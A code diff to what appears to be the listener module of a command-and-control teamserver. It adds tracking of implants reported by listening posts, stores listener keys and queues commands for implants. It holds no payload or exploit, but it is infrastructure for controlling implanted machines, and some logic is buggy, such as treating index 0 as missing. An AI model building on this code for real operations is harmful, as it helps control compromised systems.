@@ -42,7 +42,6 @@ def lp_initialized(frame, teamserver):
     data = {'component_id': frame['component_id'], "cmd": "lpmo",
             "args": [{"tpk": teamserver.initial_public_key._public_key}],
             "txid": frame['txid']}
-    # TODO: Value setting, cooking
     instruction_frame = instructions.create_instruction_frame(data)
     reply_frame = instruction_frame
     teamserver.logging.log(f"Got new listening post! ID: {reply_frame['component_id']}", source="lib.listener")
@@ -90,8 +89,17 @@ def lp_getcmd(frame, teamserver):
     :return:
     """
     lp_implants = []
-    lp_implants.append(next(item for item in teamserver.implants if item["lp_id"] == frame['component_id']))
+    try:
+        lp_implants.append(next(item for item in teamserver.implants if item["lp_id"] == frame['component_id']))
+    except StopIteration:
+        # Implant not seen by teamserver before, extract the manifest from the request:
+        implant_manifest = frame['args'][1]['implants']
+        lp_implants = implant_manifest
+        update_lp_manifest(teamserver, implant_manifest, frame['component_id'])
     reply_commands = []
+    lp_index = find_component_index_by_id("listener", frame['component_id'], teamserver)
+    teamserver.listeners[lp_index]['lpk'] = frame['args'][0]['lpk']
+    # TODO: Make sure lp_implants is an index of every implant's id
     for implant in lp_implants:
         # TODO: Update command state, or move it into a finished queue
         try:
@@ -107,6 +115,7 @@ def lp_getcmd(frame, teamserver):
                 teamserver.cmd_queue.pop(cmd_index)
         except StopIteration:
             pass
+    # TODO: Use the TS keypair stored with the listener in teamserver.listeners
     if len(reply_commands) is not 0:
         data = {'component_id': frame['component_id'], "cmd": "rcmd",
                 "args": [reply_commands, {"tpk": teamserver.initial_public_key._public_key}], "txid": frame['txid']}
@@ -128,6 +137,32 @@ def find_lp_pubkey(search_key, teamserver):
     """
     # TODO:
     next(item for item in teamserver.listeners if item["lpk"] == search_key)
+
+
+def find_component_index_by_id(component_name, component_id, teamserver):
+    try:
+        if component_name == "listener":
+            implant_index = next(index for (index, d) in enumerate(teamserver.listeners) if
+                                 d["component_id"] == component_id)
+        else:
+            implant_index = next(index for (index, d) in enumerate(teamserver.implants) if
+                                 d["component_id"] == component_id)
+        return implant_index
+    except StopIteration:
+        teamserver.logging.log(f"{component_id} not found!, attempted import for {component_id}",
+                               level="error", source="lib.listener")
+        pass
+
+
+def update_lp_manifest(teamserver, implant_manifest, listening_post_id):
+    listening_post_index = find_component_index_by_id("listener", listening_post_id, teamserver)
+    teamserver.listeners[listening_post_index]['implants'] = implant_manifest
+    for implant in implant_manifest:
+        implant_index = find_component_index_by_id("implant", implant['implant_id'], teamserver)
+        if implant_index:
+            teamserver.implants[implant_index] = implant
+        else:
+            teamserver.implants.append(implant)
 
 
 def start_background_loop(loop):
